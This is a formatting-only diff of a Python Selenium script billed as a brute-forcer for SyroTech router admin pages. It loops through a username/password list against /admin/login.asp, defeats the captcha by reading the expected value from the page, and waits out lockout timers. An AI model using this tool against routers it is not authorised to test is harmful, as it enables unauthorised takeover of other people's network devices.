@@ -14,13 +14,13 @@ class BruteForce(object):
         if not bin:
             options = webdriver.ChromeOptions()
             if not V:
-                options.add_argument('headless')
+                options.add_argument("headless")
             self.browser = webdriver.Chrome(options=options)
             print("> Lauching Chrome [✔]")
         else:
             options = webdriver.FirefoxOptions()
             if not V:
-                options.add_argument('headless')
+                options.add_argument("headless")
             self.browser = webdriver.Firefox(options=options)
             print("> Lauching Firefox [✔]")
 
@@ -34,8 +34,10 @@ class BruteForce(object):
             try:
                 t = self.browser.find_element_by_id("timer").text
                 print(f"Encountered 404 Sleeping for {t}s [!]")
-                time.sleep(int(t)+5)
-                return self.browser.find_element_by_id("check_code").get_attribute("value")
+                time.sleep(int(t) + 5)
+                return self.browser.find_element_by_id("check_code").get_attribute(
+                    "value"
+                )
             except Exception:
                 print("Either the site is not responding or does not exist")
                 exit()
@@ -66,11 +68,31 @@ class BruteForce(object):
 
 def main():
     parser = argparse.ArgumentParser(
-        description='BruteForce SyroTech admin page', epilog='By AlenPaulVarghese', prog="SyroTech-AdminPage-BruteForcer")
-    parser.add_argument('list', help="passwordlist where each line is in admin/password format", type=str)
-    parser.add_argument('-l', '--link', help="ip addr of the site defaul value https://192.168.1.1", default='http://192.168.1.1', metavar="")
-    parser.add_argument('-V', '--verbose', action="store_true", help="run selenium without headless")
-    parser.add_argument('-F', '--firefox', action="store_true", help="pass -F to use firefox geckodriver")
+        description="BruteForce SyroTech admin page",
+        epilog="By AlenPaulVarghese",
+        prog="SyroTech-AdminPage-BruteForcer",
+    )
+    parser.add_argument(
+        "list",
+        help="passwordlist where each line is in admin/password format",
+        type=str,
+    )
+    parser.add_argument(
+        "-l",
+        "--link",
+        help="ip addr of the site defaul value https://192.168.1.1",
+        default="http://192.168.1.1",
+        metavar="",
+    )
+    parser.add_argument(
+        "-V", "--verbose", action="store_true", help="run selenium without headless"
+    )
+    parser.add_argument(
+        "-F",
+        "--firefox",
+        action="store_true",
+        help="pass -F to use firefox geckodriver",
+    )
     options = parser.parse_args()
     if not os.path.isfile(options.list):
         print(f"File not found --> {options.list}")
@@ -78,7 +100,7 @@ def main():
     print("> Wordlist Found [✔]")
     brute = BruteForce(options.firefox, options.verbose)
     for x, y in BruteForce.wordlist_parser(options.list):
-        brute.get(options.link+"/admin/login.asp")
+        brute.get(options.link + "/admin/login.asp")
         cap = brute.solve_cap()
         print(f"Trying {x}/{y} [?]", end=" - ")
         brute.fill_forms(x, y, cap)
